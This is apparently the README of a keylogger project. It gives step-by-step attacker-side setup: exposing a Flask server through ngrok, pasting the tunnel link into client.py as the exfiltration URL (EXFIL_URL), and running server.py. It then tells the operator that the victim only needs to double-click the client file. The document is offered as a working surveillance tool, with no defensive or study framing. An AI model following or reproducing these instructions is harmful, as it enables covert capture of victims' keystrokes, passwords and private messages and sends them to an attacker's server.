# Key_Logger


For Server Side (Attacker Side)

1. Install ngrok if you haven't already: https://ngrok.com/download
Sign up for an account and get your auth token. it should be available on the signup dashboard.
2. Authenticate ngrok with your auth token:
The command will automatically be set up for you on the dashboard.
 ngrok authtoken YOUR_AUTH_TOKEN
just ctrl C+V into you attacker terminal.
Run the following command to expose the Flask server to the internet using ngrok:
ngrok http 5000
this will give you a link like   https://**********.ngrok-free.app -> http://localhost:5000
choose the 1st one and paste it into the client.py file inplace of EXFIL_URL
remember to enclose in the `` quotations as well
Now run the server.py on another terminal


For Client Side (Victim Side)

just double-click the file :)
